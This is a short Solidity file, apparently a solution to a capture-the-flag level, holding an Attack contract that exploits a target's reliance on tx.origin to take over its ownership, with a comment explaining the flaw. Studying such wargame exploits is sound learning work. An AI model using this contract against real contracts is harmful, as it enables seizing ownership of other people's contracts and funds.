pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}


contract Attack {
    
    function startAttack(address _address) external {
        ITelephone(_address).changeOwner(msg.sender);
    }
}

//tx.origin can be exploited by attackers. If an address calls a malicious contract that calls out
//a function that uses tx.origin, origin of the transaction will come from the address, not the contract
//or the attacker's address